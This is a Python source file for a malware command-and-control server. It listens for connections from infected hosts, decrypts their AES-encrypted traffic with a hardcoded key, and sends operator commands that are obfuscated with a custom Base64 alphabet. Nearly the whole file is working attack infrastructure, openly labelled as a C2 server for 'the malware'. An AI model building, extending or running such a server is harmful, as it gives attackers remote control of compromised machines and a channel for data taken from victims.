import socket
import base64
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def encode_custom_base64(input_str):
    # Custom Base64 alphabet
    custom_alphabet = "CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/"
    
    # Standard Base64 alphabet for translation
    standard_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    encoded_bytes = base64.b64encode(input_str.encode('utf-8'))
    encoded_str = encoded_bytes.decode('utf-8')
    
    # Create a translation table between the custom and standard Base64 characters
    translation_table = str.maketrans(standard_alphabet, custom_alphabet)
    custom_encoded_str = encoded_str.translate(translation_table)
    
    return custom_encoded_str

def decode_custom_base64(encoded_str):
    # Custom Base64 alphabet
    custom_alphabet = "CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/"
    
    # Standard Base64 alphabet for translation
    standard_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    # Create a translation table between the custom and standard Base64 characters
    translation_table = str.maketrans(custom_alphabet, standard_alphabet)
    
    # Translate the encoded string to standard Base64 using the custom alphabet
    translated_str = encoded_str.translate(translation_table)
    
    # Decode the translated string using standard Base64
    decoded_bytes = base64.b64decode(translated_str)
    
    # Convert bytes to a string (assuming the decoded data is text)
    decoded_str = decoded_bytes.decode('utf-8', errors='ignore')
    
    return decoded_str

# AES Encryption/Decryption
def encrypt(data, key):
    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return cipher.iv + ct_bytes

def decrypt(enc_data, key):
    iv = enc_data[:16]
    obj = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv)
    return obj.decrypt(enc_data[16:]).decode('utf-8', errors='ignore')
    # obj = AES.new(key.encode('utf-8'), AES.MODE_CBC)
    # return obj.decrypt(enc_data).decode('utf-8', errors='ignore')

# Function to read from file and decrypt
def decrypt_file(file_path, key):
    try:
        # Open and read the encrypted data from the file (assuming it's in Base64 format)
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        
        # Decrypt the data
        print(decrypt(encrypted_data, key))
        
    except Exception as e:
        print(f"Error: {e}")

# Handle individual client connections
def handle_client(client_socket, addr):
    print(f"Connection from {addr} established.")
    try:
        # Buffer to hold incoming data
        data_received = b''

        while True:
            # Attempt to receive data (this will block until data is available)
            chunk = client_socket.recv(1024)
            if not chunk:  # No more data, break the loop
                break

            data_received += chunk  # Append chunk to total data
            print(f"Received chunk: {chunk}")

            # Process received data immediately
            if len(data_received) >= 16:  # Ensure we have enough data for decryption
                try:
                    # Decrypt the received data
                    decrypted_output = decrypt(data_received, 'ijklmnopqrstuvwx')
                    print(f"Decrypted output: {decrypted_output}")

                    # Clear the buffer after processing (optional)
                    data_received = b''  # Reset the buffer after processing
                    
                except Exception as e:
                    print(f"Decryption error: {e}")

        if data_received:  # Any remaining data after loop
            try:
                # Attempt to decrypt remaining data
                decrypted_output = decrypt(data_received, 'ijklmnopqrstuvwx')
                print(f"Decrypted output: {decrypted_output}")
            except Exception as e:
                print(f"Decryption error on remaining data: {e}")

    except Exception as e:
        print(f"Error: {e}")
    finally:
        client_socket.close()
        print(f"Connection from {addr} closed.")

# Send commands to the malware
def command_sender(client_socket):
    while True:
        command = input("Enter command to send (or 'exit' to quit): ")
        if command.lower() == 'exit':
            break
        encoded_command = encode_custom_base64(command)
        client_socket.send(encoded_command.encode('utf-8'))
        print(f"Sent command: {command} = {encoded_command}")
        

# C2 Server Setup
def start_c2_server(host='0.0.0.0', port=8910):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"C2 Server listening on {host}:{port}")

    while True:
        client_socket, addr = server_socket.accept()
        # Create a new thread for each client connection
        client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
        client_thread.start()

        # Start a command sender thread for this client
        # command_thread = threading.Thread(target=command_sender, args=(client_socket,))
        # command_thread.start()

if __name__ == "__main__":
    start_c2_server()
